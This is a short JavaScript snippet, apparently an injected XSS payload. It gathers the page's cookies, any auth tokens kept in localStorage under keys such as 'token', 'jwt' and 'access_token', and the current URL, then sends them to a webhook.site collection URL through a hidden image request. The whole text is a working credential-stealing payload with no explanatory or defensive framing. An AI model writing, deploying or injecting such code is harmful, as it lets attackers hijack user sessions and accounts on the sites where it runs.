const data = encodeURIComponent(JSON.stringify({
  cookie: document.cookie,
  jwt: localStorage.getItem('token') || localStorage.getItem('jwt') || localStorage.getItem('auth') || localStorage.getItem('access_token'),
  url: location.href
}));
new Image().src = 'https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536?d=' + data;
